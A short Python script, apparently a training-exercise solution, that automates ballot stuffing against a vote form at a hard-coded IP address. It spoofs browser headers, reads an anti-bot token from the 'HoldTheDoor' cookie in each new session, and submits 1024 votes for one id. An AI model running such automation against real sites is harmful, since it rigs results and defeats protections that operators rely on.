#!/usr/bin/python3
"""level 0  """

import requests
from bs4 import BeautifulSoup

url = "http://158.69.76.135/level2.php"
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0'
h = {
    "User-Agent": user_agent,
    "referer": url
}
id = "4291"
contador = 1024

for i in range(contador):

    with requests.Session() as s:
        r = s.get(url, headers={'User-Agent': user_agent})
        c = r.cookies
        key_form = ""
        for cookie in c:
            if cookie.name == 'HoldTheDoor':
                key_form = cookie.value
                break

        l = s.post(url, data={'id': id, 'holdthedoor': 'Submit', 'key': key_form}, headers=h, cookies = c)